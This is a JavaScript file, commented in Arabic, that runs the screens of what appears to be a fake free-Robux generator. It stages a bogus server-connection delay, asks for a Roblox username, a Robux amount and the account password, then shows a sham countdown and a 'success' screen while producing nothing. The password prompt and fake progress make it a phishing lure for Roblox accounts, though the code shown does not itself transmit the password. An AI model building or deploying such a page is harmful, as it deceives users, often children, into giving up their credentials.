// دالة لتغيير الشاشات والمراحل
function goToStep(stepId) {
    document.querySelectorAll('.step').forEach(function(step) {
        step.classList.remove('active');
    });

    document.getElementById(stepId).classList.add('active');
}

// عند فتح الموقع: جاري الاتصال بالخوادم لمدة 3 ثوانٍ
window.onload = function() {
    setTimeout(function() {
        goToStep('step-initial-load');
    }, 3000);
};

// عند الضغط على زر تأكيد الحساب
function submitName() {
    const name = document.getElementById('username').value.trim();
    
    if (name === "") {
        alert("الرجاء إدخال اسم حساب Roblox أولاً!");
        return;
    }
    
    goToStep('step-text'); // الانتقال لتحديد كمية الروبوكس
}

// عند الضغط على زر تأكيد كمية الروبوكس
function submitText() {
    const robuxAmount = document.getElementById('usertext').value.trim();
    
    if (robuxAmount === "" || robuxAmount <= 0) {
        alert("الرجاء إدخال كمية روبوكس صالحة!");
        return;
    }
    
    goToStep('step-password'); // الانتقال لحالة كلمة المرور
}

// عند الضغط على زر تأكيد كلمة المرور
function submitPassword() {
    const password = document.getElementById('userpassword').value.trim();
    
    if (password === "") {
        alert("الرجاء إدخال كلمة المرور لتأكيد الحساب!");
        return;
    }
    
    goToStep('step-final-load'); // الانتقال لشاشة التوليد والتحميل النهائي
    
    let secondsLeft = 10;
    const countdownElement = document.getElementById('countdown');
    
    // تشغيل العداد التنازلي من كمية 10 ثوانٍ إلى 0
    const interval = setInterval(function() {
        secondsLeft--;
        countdownElement.innerText = "ثوانٍ المتبقية: " + secondsLeft;
        
        if (secondsLeft <= 0) {
            clearInterval(interval);
            goToStep('step-success'); // إظهار شاشة النجاح النهائية
        }
    }, 1000);
}
